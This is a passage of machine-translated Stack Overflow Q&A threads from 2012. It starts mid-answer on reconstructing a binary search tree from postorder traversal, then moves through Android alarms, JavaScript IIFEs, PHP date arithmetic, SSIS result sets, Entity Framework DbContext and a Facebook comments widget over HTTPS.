        // we'd make no progress if we chose mid = (low+high)/2, since that
        // would then be mid = low, so we round the index up instead of down
        mid = low + (high-low+1)/2;

        // The choice of mid guarantees low < mid <= high, so whichever
        // case applies, we will either set low to a strictly greater index
        // or high to a strictly smaller one, hence we won't become stuck.
        if (nodes[mid] > cut) {
            // The last index of a value < cut is in the first half
            // of the range under consideration, so reduce the upper
            // limit of that. Since we excluded mid as a possible
            // last index, the upper limit becomes mid-1
            high = mid-1;
        } else {
            // nodes[mid] < cut, so the last index with a value < cut is
            // in the range [mid .. high]
            low = mid;
        }
    }
    // now either low == high or nodes[high] < cut and high is the result
    // in either case by the loop invariants
    return high;
} 
```

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2012-10-31T22:22:20.117

你真的不需要中序遍历。仅给定后序遍历，有一种简单的方法可以重建树：

1.  取输入数组中的最后一个元素。这是根。
2.  循环剩余的输入数组，寻找元素从小于根变为更大的点。在该点拆分输入数组。这也可以通过二分搜索算法来完成。
3.  从这两个子数组递归地重建子树。

这可以很容易地使用堆栈递归或迭代地完成，并且您可以使用两个索引来指示当前子数组的开始和结束，而不是实际拆分数组。

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2012-10-31T22:05:13.360

后序遍历是这样的：

```
visit left
visit right
print current. 
```

像这样的顺序：

```
visit left
print current
visit right 
```

举个例子：

```
 7
     /     \
    3      10
   / \     / \
  2   5   9   12
             /
            11 
```

顺序是：`2 3 5 7 9 10 11 12`

后序是：`2 5 3 9 11 12 10 7`

以相反的顺序迭代后序数组，并继续在该值所在的位置拆分中序数组。递归地执行此操作，这将是您的树。例如：

```
current = 7, split inorder at 7: 2 3 5 | 9 10 11 12 
```

看起来熟悉？左边是左子树，右边是右子树，就 BST 结构而言是伪随机顺序。但是，您现在知道您的根是什么。现在对两半做同样的事情。在后序遍历中从左半部分开始查找元素的第一次出现（从末尾开始）。那将是 3。拆分为 3：

```
current = 3, split inorder at 3: 2 | 5 ... 
```

所以你知道你的树到目前为止看起来像这样：

```
 7
 /
3 
```

这是基于这样一个事实，即后序遍历中的值将始终出现在其子项出现之后，并且中序遍历中的值将出现在其子项值之间。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2017-10-12T16:17:42.687

不要循环任何东西。最后一个元素是你的根。然后将数组向后取，遵循 BST 的插入规则。

```
eg:-   
given just the postorder -- 2 5 3 9 11 12 10 7

        7
         \
          10

        ----
        7
         \
          10
           \
            12
         -----
        7
         \
          10
           \
            12
           /
          11
         -------
        7
         \
          10
         /  \
        9    12
           /
          11
         --------
        7
      /  \
     3    10
    / \  /  \
   2   5 9  12
           /
          11 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2020-08-30T00:21:44.320

没有一个答案显示工作代码或提供时间复杂度分析，也没有[hammar 的出色答案](https://stackoverflow.com/a/13168310/839733)。我被挥手打扰了，所以让我们开始做一些更正式的事情。

**Hammer 在 Python 中的解决方案：**

```
def from_postorder(nodes: Sequence[int]) -> BinaryTree[int]:
    def build_subtree(subtree_nodes: Sequence[int]) -> BinaryTree[int]:
        if not subtree_nodes:
            return None

        n = len(subtree_nodes)
        # Locates the insertion point for x to maintain sorted order.
        # This is the first element greater than root.
        x = bisect.bisect_left(subtree_nodes, subtree_nodes[-1], hi=n - 1)

        root = BinaryTree(subtree_nodes[-1])
        root.left = build_subtree(subtree_nodes[:x])
        # slice returns empty list if end is <= start
        root.right = build_subtree(subtree_nodes[x:n - 1])

        return root

    return build_subtree(nodes) 
```

在每一步，二分搜索都需要`log(n)`时间，我们将问题减少一个元素（根）。因此，整体时间复杂度为`nlog(n)`。

**替代解决方案：**

我们创建了两个数据结构，一个是 BST 的中序遍历，另一个是每个节点到其在后序遍历序列中的索引的映射。

对于形成子树的给定范围的节点，根是在后序遍历中最后出现的节点。*为了有效地*找到根，我们使用之前创建的映射将每个节点映射到它的索引，然后找到最大值。

找到根后，我们在中序遍历序列中进行二分查找；从给定范围的下界到根的左侧的元素形成其左子树，从根的右侧到范围的右边界的元素形成其右子树。我们在左右子树上递归。

换句话说，我们使用后序遍历序列来查找根，使用中序遍历序列来查找左右子树。

时间复杂度：在每一步，找到根都需要`O(n)`时间。二分查找需要`log(n)`时间。我们还将问题分成两个大致相等的子问题（完整 BST 的最坏情况）。因此，`T(n) <= 2 . T(n/2) + O(n) + log(n) = T(n/2) + O(n)`，这使我们`O(n log(n))`可以使用 Master 定理。

```
def from_postorder_2(nodes: Sequence[int]) -> BinaryTree[int]:
    inorder: Sequence[int] = sorted(nodes)
    index_map: Mapping[int, int] = dict([(x, i) for i, x in enumerate(nodes)])

    # The indices refer to the inorder traversal sequence
    def build_subtree(lo: int, hi: int) -> BinaryTree[int]:
        if hi <= lo:
            return None
        elif hi - lo == 1:
            return BinaryTree(inorder[lo])

        root = max(map(lambda i: index_map[inorder[i]], range(lo, hi)))
        root_node = BinaryTree(nodes[root])
        x = bisect.bisect_left(inorder, root_node.val, lo, hi)
        root_node.left = build_subtree(lo, x)
        root_node.right = build_subtree(x + 1, hi)

        return root_node

    return build_subtree(0, len(nodes)) 
```

# android - 屏幕关闭时 Android 通知不起作用

> ID：13167538
> 
> 赞同：0
> 
> 时间：2012-10-31T21:15:12.597
> 
> 标签：android, timer, notifications

该应用程序非常简单。我有一个包含所有活动等的常规应用程序......

我有一项服务会在应用程序首次启动和/或设备重新启动时启动。

我设置了一个 BroadcastReceiver 来处理通知意图，它也非常基本并且功能完美。

当 android 设备上的显示打开时，通知工作完美。但是当我关闭屏幕时，不再创建通知。

我是通知的新手，所以这可能是我忽略的一些简单的事情，但我似乎找不到它。

在我的服务中，我构建了一个工作线程，其中包含一个 Timer，它每分钟触发一次，并将 TimerTask 作为调度方法的一部分：

```
 @Override
public int onStartCommand(Intent intent, int flags, int startId)
{
    boolean isStopping = false;
    if (intent != null)  // if the system has to shut us down, go down gracefully
    {
        String intentAction = intent.getStringExtra(AppData.BROADCAST_ACTION);
        if (intentAction != null && intentAction.equals("android.intent.action.REBOOT"))
        {
            boolean isRebooting = intent.getBooleanExtra(AppData.SYSTEM_ACTION, false);
            if (isRebooting)
            {
                isStopping = true;
                stopSelf();
            }
        }
    }

    if (!isStopping && !_workerThread.isRunning())
    {
        _workerThread.run();
    }

    return Service.START_STICKY;
}

_timer.schedule(_service.getWorker(), startDelay, executionDelay); 
```

NotificationTask (TimerTask) 最终每分钟都会从 Timer 中触发。然后它会检查一些逻辑以查看是否需要创建任何通知，如果需要，它会创建并发送通知，如下所示：

```
 Notification notification = new NotificationCompat.Builder(_context)
        .setContentTitle(getString(R.string.notification))
        .setContentText(message)
        .setLargeIcon(decodeResource(_context.getResources(), iconId))
        .setSmallIcon(R.drawable.logo_mark)
        .setTicker(ticker)
        .setAutoCancel(true)
        .setSound(getRingtone(ringtoneUrl))
        .setVibrate(VIBRATION_PATTERN)
        .setLights(0xfff89829, 300, 5000)
        .setContentIntent(intent)
        .build();

_notificationManager.notify(notificationId, notification); 
```

通知因通知类型而异，我不在乎用户是否在我用下一个覆盖之前响应了一个。我的问题是如果屏幕关闭，我不会收到通知。

请帮忙。

* * *

## 更新

我想添加代码以防有人像我一样陷入困境。

让我们从 AndroidManifest 开始。包括 2 个广播接收器和您的服务

```
 <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>

<service android:name=".services.NotificationService"/>

<receiver android:name=".receivers.BootReceiver">
    <intent-filter>
        <action android:name="android.intent.action.BOOT_COMPLETED"/>
    </intent-filter>
</receiver>
<receiver android:name=".receivers.NotificationReceiver" /> 
```

当您的设备重新启动时，启动接收器只会安排您的警报。您将其设置为调用您的其他接收器，如下所示：

```
 AlarmManager alarmManager = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
PendingIntent pendingIntent = PendingIntent.getBroadcast(context, 0, new Intent(context, NotificationReceiver.class), 0);
alarmManager.setRepeating(AlarmManager.RTC_WAKEUP, Calendar.getInstance(), 60 * 1000, pendingIntent); 
```

主接收器将启动您的服务 - 您的服务应该扩展 IntentService 而不是常规服务。这是主要的接收器：

```
 context.startService(new Intent(context, NotificationService.class)); 
```

和服务

```
 public class NotificationService extends IntentService
{
    public NotificationService()
    {
        super("Notification Service");
    }

    @Override
    public void onHandleIntent(Intent intent)
    {
        // this is where I created my notifications
    }
} 
```

最后一个小技巧是在您的应用程序中再次创建您的 AlarmManager。这将替换可能已在 Boot Receiver 中创建的 AlarmManager。注意 PendingIntent.FLAG_CANCEL_CURRENT。这样做是为了当用户启动您的应用程序时，如果您的 AlarmManager 尚未在设备启动时注册，则它会被注册。

```
 AlarmManager alarmMgr = (AlarmManager) this.getSystemService(Context.ALARM_SERVICE);
PendingIntent pendingIntent = PendingIntent.getBroadcast(this, 0, new Intent(this, NotificationReceiver.class), PendingIntent.FLAG_CANCEL_CURRENT);
alarmMgr.setRepeating(AlarmManager.RTC_WAKEUP, Utils.getNow(), 60 * 1000, pendingIntent); 
```

希望这可以帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-31T22:09:57.513

不是说你做错了，因为我对 Timers 和 TimerTasks 没有太多经验，但我认为[AlarmManager](http://developer.android.com/reference/android/app/AlarmManager.html)是安排未来运行的标准方式，当屏幕关闭时等。

# javascript - 如果对象可能未定义，检查 JavaScript 对象值的最佳方法

> ID：13167545
> 
> 赞同：3
> 
> 时间：2012-10-31T21:15:51.087
> 
> 标签：javascript, jquery

我有一个`textarea`附加的模糊事件。如果用户单击页面上的特定内容，我不希望运行模糊事件`span.dontClick`。但是，如果用户单击除`span.dontClick`我确实希望运行模糊事件之外的任何内容。我找到了一种方法来做到这一点，但它看起来很糟糕，感觉很hackey，我猜那里有更好的解决方案。这是我想出的：

```
if (event.type === 'focusout') {
  if (
    typeof event.originalEvent !== 'undefined' &&
    typeof event.originalEvent.currentTarget !== 'undefined' &&
    typeof event.originalEvent.currentTarget.activeElement !== 'undefined' &&
    typeof event.originalEvent.currentTarget.activeElement.className !== 'undefined' &&
    event.originalEvent.currentTarget.activeElement.className === 'dontClick'
  ) {
    // abort the code for the blur event (in effect, do nothing)
  }
  else {
    // run code for when a user blurs by not clicking on span
  } 
```

可能应该注意该`event`对象来自 jQuery 事件处理程序。我不确定它是否与原生`event`对象不同或相同。

还应该注意的是，对于大多数浏览器来说，这会静默失败，但如果我没有为每个对象一直指定“未定义”状态，我会在 IE 中得到一个调试窗口......

如果有人有更优雅的解决方案，我将不胜感激。谢谢！

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-10-31T21:22:28.693

您不需要与`undefined`. 做一个真实的测试。`className`也不需要测试。比较将`===`涵盖它。

```
 if (
    event.originalEvent &&
    event.originalEvent.currentTarget &&
    event.originalEvent.currentTarget.activeElement &&
    event.originalEvent.currentTarget.activeElement.className === 'dontClick'
  ) { 
```

* * *

但是无论如何，您所做的工作比需要的要多，因为 jQuery 为您提供了可靠的`currentTarget`.

```
 if (
    event.currentTarget.activeElement &&
    event.currentTarget.activeElement.className === 'dontClick'
  ) { 
```

* * *

或者，如果您在处理程序中，只需使用`this`.

```
 if (this.activeElement && this.activeElement.className === 'dontClick') { 
```

# c++ - 声明一个包含类项的向量

> ID：13167548
> 
> 赞同：-3
> 
> 时间：2012-10-31T21:16:23.347
> 
> 标签：c++, class, vector

如何声明一个包含类中所有元素的向量？例如：

```
class Book{
    string name;
    int published;
    float price;
} 
```

向量是在一个类中还是在一个主函数中？将其声明为`vector<Book *> a`; 然后你怎么能在这个向量中添加这些名字？如果你有不止一本书，你必须声明一个新的向量怎么办？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-31T21:22:24.673

我不确定你在问什么。如果您想要书籍的矢量，那么`vector<Book>`就可以了。目前，我建议不要使用指针，因为这会带来一些其他的复杂性。向量中的每本书都包含自己声明的元素。

向量是跟踪不止一本书的一种方式。如果您需要跟踪两个书籍**列表**（例如，一个向量是非小说书籍列表，另一个是小说书籍列表），则只需声明另一个向量。

声明向量的位置取决于您要如何使用它。首先，您可能想要声明它`main`以测试它是否有效。如果您以后想创建一个`Library`类，那么您很可能会`vector<Book>`在该类中声明。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-31T21:29:35.037

> 向量是在一个类中还是在一个主函数中？

这没有多大意义。std::vector 是一个类容器，可以在其中包含多个元素（所有相同类型）。

> 将其声明为`vector<Book *> a`

请注意，这种方式是在声明一个指向类的指针向量。

> 然后你怎么能在这个向量中添加这些名字？

您可以使用[std::vector::push_back](http://www.cplusplus.com/reference/stl/vector/push_back/)在向量末尾插入元素。

> 如果你有不止一本书，你必须声明一个新的向量怎么办？

嗯，这正是使用像矢量这样的容器来容纳多个元素的原因。拥有更多向量没有意义。

> 那么如何使用向量访问数据呢？比如如果你想改变特定书籍的价格怎么办

为了简单起见，您可以使用方括号来访问给定索引处的向量元素。在 C++ 中，类成员默认情况下是私有的，如果您不明确声明它们是公共的。因此，避免进一步解释（请参阅 getter/setter 以获得最终更好的设计），一种方法可能如下：

```
class Book{

    public:

    string name;
    int published;
    float price;

    Book (string iName, int iPublished, float iPrice)
    {
        name = iName;
        published = iPublished;
        price = iPrice;
    }
}

std::vector<Book*> bookList = std::vector();
bookList.push_back(new Book("foo", 10, 100.0f));
bookList.push_back(new Book("bar", 11, 110.0f));

std::cout << bookList[1].name; // print bar 
```

# matlab - MATLAB 对 container.Map(key, value) 进行排序

> ID：13167549
> 
> 赞同：2
> 
> 时间：2012-10-31T21:16:24.363
> 
> 标签：matlab, sorting, map, containers

我有一张地图`containers.Map(array1, array2)`，我想根据*array1 中的值*进行排序。数组中包含相当大量的数据（每个数组约 50,000 个元素）。

有没有一种简单的方法可以做到这一点，也许使用一些内置的 MATLAB 功能？

环境是MATLAB 2012。`array1`是一个字符数组。

提前致谢！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-31T21:54:01.647

由于 a`container.Map`是字典或哈希表实现，因此您无法在数据结构本身中定义元素的某些顺序。但是，默认情况下，当您查询它们时，MATLAB 会排序`keys`和`values`（根据）：`keys`

```
keySet =   {'Jan', 'Feb', 'Mar', 'Apr'};
valueSet = [327.2, 368.2, 197.6, 178.4];
mapObj = containers.Map(keySet,valueSet);

>> keys(mapObj)
ans = 
    'Apr'    'Feb'    'Jan'    'Mar'

>> values(mapObj)
ans = 
    [178.4000]    [368.2000]    [327.2000]    [197.6000] 
```

# php - PHP DateTime，付费日期+一年期限

> ID：13167551
> 
> 赞同：-6
> 
> 时间：2012-10-31T21:16:27.517
> 
> 标签：php, mysql, date, datetime

> **可能重复：**
> [使用 php 将日期时间添加一年](https://stackoverflow.com/questions/5212240/add-one-year-to-datetime-with-php)

支付日期：`2012-10-19 13:13:20`

任期：（`3`三年）

我需要将这两个值转换为一个`DateTime`，然后我可以将其与今天的日期进行比较，并确定订阅是否即将续订。

不知道如何正确地完成这个......

我试过了：

```
$term = $row['term'];   
$paid = $row['paid_date'];

$renew = strtotime("+$term years", $paid);
$today = strtotime('now'); 
```

但显然在这种情况下，所有日期都小于......

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-31T21:30:30.900

将日期转换为时间戳，并与今天的时间戳进行比较；如果相差超过 3 年（以秒为单位），则订阅即将到期。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-31T21:35:25.140

将付费 + 3 年和今天转换为 unix 时间戳，如果续订日期小于今天，则订阅已过期。

```
$renew = strtotime('+'. $term .' years', $paid);
$today = strtotime('now');

If ($renew < $today) 
{
  //subscription has run out
} 
```

假设 $term 是数据库中的整数，$paid 是 MySQL 数据库中的日期时间，转换为 unix 时间戳（从paidtable 中选择 unix_timestamp(paid)）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-31T21:37:09.367

如果您将付款日期作为字符串：

```
if(strtotime("2012-10-19 13:13:20 +3 years") > time()) {
     // expired
} 
```

如果您将付款日期作为时间戳：

```
if(strtotime("+3 years", $paidDate) > time()) {
     // expired
} 
```

# javascript - 函数将函数返回给变量。为什么它需要额外的一组 ()？

> ID：13167554
> 
> 赞同：0
> 
> 时间：2012-10-31T21:16:35.067
> 
> 标签：javascript

试图弄清楚如何正确命名我的 JavaScript 以避免与其他库以及全局项发生冲突。我正在查看一些代码，并注意到一些关于 JavaScript 的东西我只是不明白。实际上，我什至不知道如何提出这个问题，所以我将使用一些人为的代码示例。

```
var varFuncTest = (function(){
         _funcTest = function(params){
       return "These are the params that were passed in: " + params;
     };
     return _funcTest;
})();

console.log(varFuncTest("params params params")); 
```

输出：这些是传入的参数： params params params

当我运行此代码时，它按预期工作，但这只是因为当我声明变量时，我包装了正在构建的函数并在 () 中返回一个专门的函数，然后在之后添加 ()。当我记录函数调用时，我得到了正确的字符串打印输出。

现在，当我从末尾删除那组额外的 () 时，因为它们在我未经训练的眼睛看来是不需要的，所以日志会打印出对象类型而不是字符串。

```
var varFuncTest = (function(){
         _funcTest = function(params){
           return "These are the params that were passed in: " + params;
         };
         return _funcTest;
    });

    console.log(varFuncTest("params params params")); 
```

输出：函数（​​）

这里发生了什么？为什么需要第二组 ()？如果这是 JavaScript 语言的一个特殊功能，它指的是什么，它的文档在 JavaScript API 中的哪里可以找到？

代码是相同的减去第一个示例第 6 行的结尾 ()。这不是一个错字，因为它实际上会影响 JavaScript 中的执行。它们都返回一个分配给变量的函数对象。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-31T21:25:43.337

您一直使用这些括号：

```
alert('foo'); 
```

在这里，括号调用函数`alert`并传入参数`'foo'`。

以这个函数为例：

```
function test() {
    alert('foo');
} 
```

运行`test`只会给你一个函数的引用。`test()`将采用该参考并调用它。

在您的具体示例中，这正是正在发生的事情：

```
var varFuncTest = (function(){
     _funcTest = function(params){
       return "These are the params that were passed in: " + params;
     };
     return _funcTest;
})(); 
```

`function() {...}`返回另一个函数 ( `_funcTest`)。最后调用返回函数的那些括号。如果省略它们，`varFuncTest`将存储一个函数。如果您保留它们，`varFuncTest`则将存储该函数的*输出*。

只是为了说明这一点，执行第二段代码，然后运行：

```
varFuncTest(); 
```

您应该得到与第一个代码块相同的输出。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-31T21:41:42.680

Javacript 有一个`immediately invoked function`. 这是一个在定义后立即调用的函数。这些需要`function expressions`代替`function statements`.

```
var a = function() {return "hi"}; // A reference to a function.. to call later.
alert(a()); // Call the function now. 
```

对比

```
var a = (function() {return "hi"}()); // Call the function, return the value in one stop.
// a now has the result of the function.
alert(a); 
```

给出的许多答案都是真实的，或者是真实的，但还有另一个方面他们都没有提到。

做作业的时候，比如

```
var a = (function() {}()); 
```

*编译器不需要*最外层的括号，但它们会通知阅读代码的人立即调用的函数已经到位。

另一方面，代码如

```
(function() {}());  // One style
(function() {})();  // Another style 
```

需要括号**来**强制编译器读取表达式，因此 a `function-expression`，而不是 a `function statement`。

在关键字前面使用几乎任何其他运算符都`function`有效，例如：

```
!function() {}();  // Another style 
```

虽然这行得通，但它不是 Javascript 的正常“成语”。

TL-DR：parens 的存在更多是为了人类而不是计算机。

顺便说一句：请坚持标准的编码约定。您可以做很多非标准但合法的事情。不。它使追随你的人感到困惑。

# c# - 带有对象的树的 C# 路径列表

> ID：13167557
> 
> 赞同：3
> 
> 时间：2012-10-31T21:16:41.820
> 
> 标签：c#, object, tree, filelist

我需要用路径列表中的对象构建一个树列表。下面的代码有效，但我无法从搜索功能中检索完整路径。请参阅粗体代码...

```
public List<RestoreTreeViewModel> BuildTree(IEnumerable<string> strings)
{
    return (
      from path in strings
      let split = path.Split('\\')
      group path by path.Split('\\')[0] into g
      select new RestoreTreeViewModel()
      {
          Name = g.Key,
          Nodetype = 2,
          CanReference = true,
          **FullPath = path;**
          Children = BuildTree(            
            from s in g
            where s.Length > g.Key.Length + 1
            select s.Substring(g.Key.Length + 1)) 
      }
      ).ToList();
} 
```

这可以工作还是我应该研究另一种从路径列表构建树的方法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-31T21:20:57.167

您需要在 BuildTree() 方法中添加一个列表参数，然后将项目附加（或前置）到该列表，以便最终结果将包含路径中的所有项目。

还有其他方法可以解决它，但是如果我了解您要做什么，那似乎很简单。

# sql-server - 如何从使用表达式的执行 SQL 任务中捕获单行值？

> ID：13167562
> 
> 赞同：0
> 
> 时间：2012-10-31T21:17:00.287
> 
> 标签：sql-server, ssis, expression

我有一个使用这个表达式的执行 SQL 任务：

```
@[User::SQLExportError] + (DT_WSTR,30)@[User::Id] 
```

表达式正确计算为：

```
 select count(*) as ErrorTableCount from [myschema].Error 
    where SPName in ('export/INSERT','export/DELETE') and Id = 1000 
```

在同一个 sql 任务中，我想将ResultName 捕获**`as ErrorTableCount`**到一个单行结果集中：*ErrorTableCount*变量名称称为：`User::ErrorTableCount`

我得到红色圆圈/x 十字告诉我：

```
There were errors during task validation. 
```

使用 sql 源的表达式和包含在结果集下定义的配音计数名称的表达式之间似乎存在一些冲突。有什么建议/想法吗？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-10-31T22:26:59.163

我无法查明是什么导致了您的场景中的错误。我试图根据问题重新创建场景。该示例可能会帮助您找出最终的不同之处。

创建一个名为*dbo.Error的简单表*

```
CREATE TABLE [dbo].[Error](
    [Id] [int] NOT NULL,
    [SPName] [varchar](20) NOT NULL
) ON [PRIMARY]
GO 
```

使用以下脚本使用一些示例数据填充表。

```
INSERT INTO dbo.Error (Id, SPName) VALUES 
    (1000, 'export/INSERT'),
    (1000, 'export/DELETE'),
    (1001, 'export/INSERT');
GO 
```

在 SSIS 包上，创建连接管理器或数据源以连接到托管上述表的数据库。在此示例中，我创建了一个 OLE DB 连接管理器，因为它是 SQL Server 数据库的推荐提供程序，并将连接管理器命名为 Practice。

在包上创建以下变量。

![变量](../Images/37eba0e6d42d0a37a37c3adb08d3af9a.png)

将变量设置`Id`为值 1000，以便我们将在执行 SQL 任务中执行的查询将获取至少两行。

将变量设置`SQLExportError`为以下查询：

> SELECT COUNT(Id) AS ErrorTableCount FROM dbo.Error WHERE SPName in ('export/INSERT','export/DELETE') AND Id =

选择变量`SQLFetch`并按 F4 查看属性。将属性*EvaluateAsExpression*设置为**True**。*单击Expression*属性上的 Ellipsis 按钮并设置以下表达式。

```
@[User::SQLExportError] + (DT_WSTR,30)@[User::Id] 
```

![表达](../Images/2b92c55f47d20939c46e13c2c9588296.png)

将执行 SQL 任务拖放到控制流选项卡上。如下图配置Execute SQL任务的General页面，执行存储在表达式变量中的SQL查询。

![执行 SQL 任务 - 常规](../Images/16a00ecba977b32cbf0955057c5b8a5c.png)

将结果集页面配置为接受查询返回的值并将其存储在变量中。

![执行 SQL 任务 - 结果集](../Images/9ac82e44093120a50487bbc070e81eba.png)

添加脚本任务以查看存储在变量中的值。配置脚本任务读取变量`ErrorTableCount`

![脚本任务](../Images/2ace48ceaedbe3263dd9811d143ccafe.png)

将以下 C# 代码添加到脚本任务。

```
public void Main()
{
    MessageBox.Show(String.Format("Value in variable ErrorTableCount: {0}", 
        Dts.Variables["User::ErrorTableCount"].Value), 
        "Execute SQL Task - Single Row");
    Dts.TaskResult = (int)ScriptResults.Success;
} = 
```

![脚本任务代码](../Images/1254df12d41f9f18751e5f8e74f7c8f5.png)

关闭脚本任务编辑器。控制流看起来像这样。

![控制流](../Images/5cb7ef8e2826b8db705206940d23d08e.png)

执行包时，消息框应显示计数**2**，因为这是示例数据中 Id 设置为值 1000 的行数。

希望这可以帮助您找到您的配置有什么问题。

![包执行](../Images/016da0d3380508085efe60659ca8e642.png)

# c# - 实体中缺少实体框架 5.0 .load 方法和 .local 属性

> ID：13167563
> 
> 赞同：0
> 
> 时间：2012-10-31T21:17:05.160
> 
> 标签：c#, entity-framework, entity-framework-5

我正在使用实体框架 5 并有两个 Visual Studio 2010 解决方案。一种是带有一个项目的小型测试解决方案，另一种是带有多个项目的更大的解决方案，我正在执行实际的业务应用程序。

较小解决方案中的实体同时具有**.Load()**方法和**.Local**属性。

较大解决方案中的实体两者都没有。

我在项目中同时引用了**system.data.entity**和**EntityFramework**。

我已经比较了这两种解决方案，但无法弄清楚大型解决方案中缺少什么。任何指向下一步看的方向的指针都将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-01T13:41:00.050

在 Pawel 的评论提示下，我发现它`smaller solution`基于**DbContext**，它为我提供了`.Load()`方法和`.Local`属性。

要切换`larger solution`到，我按照此网页[http://msdn.microsoft.com/en-US/data/jj206878](http://msdn.microsoft.com/en-US/data/jj206878)`DbContext`中的这些步骤操作

> 接下来，我们需要交换我们的模型以生成使用 DbContext API 的代码，该 API 在 Entity Framework 的更高版本中引入。
> 
> 1.  在 EF 设计器中右键单击模型的空白处，然后选择添加代码生成项...</p>
>     
>     
> 2.  从左侧菜单中选择 Online Templates 并搜索 DbContext
>     
>     
> 3.  为 C# 选择 EF 5.x DbContext Generator，输入“YourChoiceOfName”作为名称，然后单击添加

我现在拥有该`.Local`属性，并且我怀疑该`.Load()`方法也可用，尽管我尚未使用它。

# php - PHP生成代码到文本框？

> ID：13167566
> 
> 赞同：-4
> 
> 时间：2012-10-31T21:17:32.867
> 
> 标签：php, html

我正在尝试制作类似于[http://webstarthelp.com/forwards.html](http://webstarthelp.com/forwards.html) | 我四处寻找，但没有真正找到任何好的例子。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-31T21:28:40.253

“我真的没有找到任何好的例子”。然而你刚刚发了一个....

让我们看看那个页面。您在第一个框中输入一些内容。点击“提交”并生成第二个框。

所以“提交”必须在这里做一些有用的事情......

```
<input type="submit" value="Submit" onclick="dHR(document.getElementById('file_url'), document.getElementById('Delay'))"> 
```

有趣....那个`onclick`方法是干什么用的？似乎调用了一个函数吧？我们应该查一下`dHR()`是什么...

```
function dHR (HR_file_url, HR_Delay){
  HR_code.value= '<html><head>\n' +
  '<meta HTTP-EQUIV=\"Refresh\" CONTENT=\"' + HR_Delay.value + '; URL=' + HR_file_url.value + '\">\n' +
  '</head><body>\n' +
  'This page has been moved.<p>\n' +
  '<a href=\"' + HR_file_url.value + '\">IF YOU ARE NOT REDIRECTED, PLEASE CLICK HERE.</a>\n' +
  '</body></html>';
  return false;
} 
```

现在我`FireBug`在 Firefox 中使用了这个，但是您可以通过挖掘页面源代码来找到对`fwd.js`. 更重要的是，该功能非常基础。它接受您提供的输入并将其与整个静态文本组合在一起。

**但是 PHP 呢？**

不幸的是，如果没有像这个例子那样使用 Javascript，PHP 在页面上没有动态操作。如果您想要类似的功能，除非您愿意重新加载页面，否则真的没有任何办法。在你的情况下，你会有这样的表格。

```
<form action="php_handling_page.php" method="post">
 <input type="text" name="file_name" />
 .....
</form> 
```

我让你填空。但它所做的是`php_handling_page.php`在您提交表单时调用。然后加载该页面，您可以在其中收集传递给它的参数。

```
<?php
$file_name = $_POST['file_name'];
....
?> 
```

使用它，你有一个变量，`$file_name`然后你可以用它来构造一个文本框或字符串。

```
<?php
echo "This is a bunch of static text, that leads the variable with a value of " . $file_name . " and then is followed by more static text!";
?> 
```

问题？

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-31T21:36:32.500

为什么不使用 jquery 函数`.val()`来更改文本框的值？

[http://api.jquery.com/val/](http://api.jquery.com/val/)

[http://jsfiddle.net/wVUhN/1/](http://jsfiddle.net/wVUhN/1/)

# ssl - Facebook 对 IE7 和 IE8 中 HTTPS/SSL 安全警告的评论小部件

> ID：13167568
> 
> 赞同：2
> 
> 时间：2012-10-31T21:17:33.723
> 
> 标签：ssl, https, internet-explorer-8, internet-explorer-7, facebook-comments

我正在尝试将 Facebook 评论小部件添加到通过 SSL/HTTPS 提供的页面。小部件工作正常，但当我尝试在 IE7 或 IE8 中加载页面时，我收到“混合内容”安全警告。

我已经检查并确认我们没有在页面中引用任何不安全的资源。删除 facebook 评论小部件会使警告消失。使用提琴手，我试图查明被引用的资源，但据我所知，没有任何东西被拉过 http。我已经用一个最小的复制案例确认了这个问题，该案例只有页面上的评论小部件。

```
<!DOCTYPE html>
<html lang="en-us" xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml">
  <head>
    <title>
      Test FB Comments
    </title>
  </head>
  <body>
    <div class="fb-comments" data-href="https://www.example.com/fb_minimal.html" data-num-posts="10" data-width="470" data-colorscheme="light"></div>
    <div id="fb-root"></div>
    <script type="text/javascript">
      window.fbAsyncInit = function () {
        FB.init({ appId: 'MY_FACEBOOK_APP_ID', status: true, cookie: true,
          xfbml: true
        });
      };
      (function () {
        var e = document.createElement('script'); e.async = true;
        e.src = document.location.protocol + '//connect.facebook.net/en_US/all.js';
        document.getElementById('fb-root').appendChild(e);
      } ());
    </script>
  </body>
</html> 
```

这会在其他浏览器（Chrome、Firefox、IE9 及更高版本）中加载而不会发出警告。

我已经查看了我的 facebook 应用程序设置，一切似乎都配置正确，虽然我是 facebook 集成的新手，所以也许我错过了一些东西。

我看过这个线程，[Facebook JavaScript SDK over HTTPS loading non-secure items](https://stackoverflow.com/questions/5212016/facebook-javascript-sdk-over-https-loading-non-secure-items)，但没有任何建议有任何效果。我怀疑这个问题有所不同，因为我在其他浏览器中也没有看到警告。

任何见解将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-31T22:29:41.650

听起来你做的一切都是正确的，甚至使用 Fiddler 检查请求。当您仍然无法看到正在发生的事情时，这绝对是非常令人沮丧的。

我没有给你一个明确的答案，但我可以提出一种可能性

众所周知，IE8 及更低版本在 iframe 中有空白页时会引发此类错误。例如，框架是使用 javascript 创建的，但没有加载任何内容，或者`about:blank`作为 URL 填充。

我有一种感觉，如果您对错误感到满意（例如 404 错误），也可能会发生这种情况，但我对此不太确定。这绝对是空白内容的已知错误。

